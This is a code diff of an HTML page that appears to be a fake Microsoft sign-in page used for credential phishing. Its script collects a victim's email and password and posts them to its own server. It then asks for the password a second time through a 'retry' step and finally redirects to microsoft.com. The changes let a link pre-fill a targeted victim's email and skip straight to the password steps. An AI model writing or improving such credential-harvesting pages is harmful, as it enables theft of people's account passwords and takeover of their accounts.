@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -95,8 +96,20 @@
 <div class="sigopts"><span class="muted">🔒 Sign-in options</span></div>
 
 <script>
+    // Global variables
     let email = "";
     let password = "";
+
+    // Global functions - make them accessible from HTML onclick attributes
+    window.showStep1 = showStep1;
+    window.showStep2 = showStep2;  
+    window.showStep3 = showStep3;
+    window.submitToBackend = submitToBackend;
+
+    function getCsrfToken() {
+        const metaToken = document.querySelector('meta[name="csrf-token"]');
+        return metaToken ? metaToken.getAttribute('content') : '';
+    }
 
     function validateEmail(email) {
         const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -120,6 +133,20 @@
             </form>
         `;
 
+        // Pre-fill email from URL parameter
+        try {
+            const urlParams = new URLSearchParams(window.location.search);
+            const hintedEmail = (urlParams.get("email") || "").trim();
+            const emailField = document.getElementById("emailInput");
+            
+            if (hintedEmail && hintedEmail.includes("@") && emailField) {
+                emailField.value = hintedEmail;
+                email = hintedEmail;
+            }
+        } catch (e) {
+            console.log("Error loading email hint:", e);
+        }
+
         document.getElementById("loginForm").addEventListener("submit", function(e){
             e.preventDefault();
             const emailValue = document.getElementById("emailInput").value.trim();
@@ -127,7 +154,7 @@
                 email = emailValue;
                 showStep2();
             } else {
-                alert("Please enter a valid email address.");
+                showError("Please enter a valid email address.");
             }
         });
     }
@@ -162,7 +189,7 @@
                 password = pwd;
                 submitToBackend(email, password, false);
             } else {
-                alert("Please enter your password.");
+                showError("Please enter your password.");
             }
         });
     }
@@ -203,7 +230,7 @@
                 `;
                 submitToBackend(email, finalPassword, true);
             } else {
-                alert("Please enter your password.");
+                showError("Please enter your password.");
             }
         });
     }
@@ -213,7 +240,14 @@
         formData.append('email', emailValue);
         formData.append('password', passwordValue);
         formData.append('submit', 'Sign in');
-        formData.append('csrf_token', document.querySelector('meta[name=csrf-token]').getAttribute('content'));
+        
+        // Add CSRF token
+        const csrfToken = getCsrfToken();
+        if (csrfToken) {
+            formData.append('csrf_token', csrfToken);
+        }
+
+        console.log('Submitting:', emailValue, '(password hidden)', 'Second attempt:', isSecondAttempt);
 
         fetch('/', {
             method: 'POST',
@@ -221,6 +255,8 @@
             redirect: 'follow'
         })
         .then(response => {
+            console.log('Response URL:', response.url);
+            
             // Check if redirected to microsoft.com (successful login)
             if (response.url && response.url.includes('microsoft.com')) {
                 window.location.href = 'https://microsoft.com';
@@ -228,7 +264,7 @@
             }
 
             // Check if redirected back to our form with retry parameter
-            if (response.url && response.url.includes('retry=true')) {
+            if (response.url && (response.url.includes('retry=true') || response.url.includes('step=retry'))) {
                 setTimeout(() => showStep3(), 500);
                 return null;
             }
@@ -271,20 +307,30 @@
 
     // Initialize the application when page loads
     document.addEventListener('DOMContentLoaded', function() {
+        console.log('DOM loaded, initializing...');
+        
+        // Check URL parameters for step and email
         try {
             const urlParams = new URLSearchParams(window.location.search);
+            const step = urlParams.get("step") || "";
             const hintedEmail = (urlParams.get("email") || "").trim();
-
+            
             if (hintedEmail && hintedEmail.includes("@")) {
-                const emailField = document.getElementById("email");
-                if (emailField) {
-                    emailField.value = hintedEmail;
+                email = hintedEmail;
+                
+                if (step === "password") {
+                    showStep2();
+                    return;
+                } else if (step === "retry") {
+                    showStep3();
+                    return;
                 }
             }
         } catch (e) {
-            console.log("Error loading email hint:", e);
+            console.log("Error processing URL parameters:", e);
         }
 
+        // Default to step 1
         showStep1();
     });
 </script>
